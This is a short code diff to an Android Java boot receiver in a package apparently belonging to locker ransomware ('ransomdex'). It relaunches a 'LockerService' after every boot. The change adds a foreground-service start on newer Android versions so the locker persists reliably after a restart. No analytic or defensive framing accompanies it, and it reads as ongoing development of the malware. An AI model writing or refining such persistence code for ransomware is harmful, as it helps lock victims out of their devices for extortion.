@@ -3,6 +3,7 @@ package com.bondex.ransomdex;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
 
 public class BootReceiver extends BroadcastReceiver {
     @Override
@@ -11,7 +12,11 @@ public class BootReceiver extends BroadcastReceiver {
         
         if (Intent.ACTION_BOOT_COMPLETED.equals(action) || "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action)) {
             Intent i = new Intent(context, LockerService.class);
-            context.startService(i);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(i);
+            } else {
+                context.startService(i);
+            }
         }
     }
 }
